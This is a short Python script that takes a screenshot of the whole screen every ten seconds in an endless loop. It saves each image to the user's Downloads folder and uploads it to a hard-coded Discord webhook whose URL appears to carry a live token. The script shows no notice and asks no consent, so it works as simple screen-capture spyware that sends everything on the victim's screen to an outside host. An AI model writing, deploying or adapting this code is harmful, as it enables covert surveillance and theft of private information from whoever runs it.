from PIL import ImageGrab
import os
import requests
import time

def send_photo(webhook_url, image_path):
    # Open the image file
    with open(image_path, 'rb') as f:
        # Prepare the payload
        payload = {
            "content": "Here's the photo:",
            "file": f
        }

        # Send the POST request to the webhook URL
        response = requests.post(webhook_url, files=payload)

        # Check if the request was successful
        if response.status_code == 200:
            print("Photo sent successfully!")
        else:
            print(f"Failed to send photo: {response.text}")

if __name__ == "__main__":
    # Replace 'YOUR_WEBHOOK_URL' with your Discord webhook URL
    webhook_url = 'https://discord.com/api/webhooks/1227439586456637463/sXQsstkmz3ZDt3Du5skmuIFu8SNXgrUSmWwXhgd4LwWuzf8wsy4q-_s6UUPeKNeGsQlu'

    # Loop infinitely
    while True:
        # Wait for 10 seconds
        time.sleep(10)

        # Take screenshot of the entire screen
        screenshot = ImageGrab.grab()

        # Save the screenshot to a file
        desktop_path = os.path.join(os.path.expanduser('~'), 'Downloads')
        screenshot.save(os.path.join(desktop_path, 'screenshot.png'))

        print("Screenshot saved as 'screenshot.png'")

        # Replace 'photo.jpg' with the path to your image file
        image_path = os.path.join(desktop_path, 'screenshot.png')

        send_photo(webhook_url, image_path)
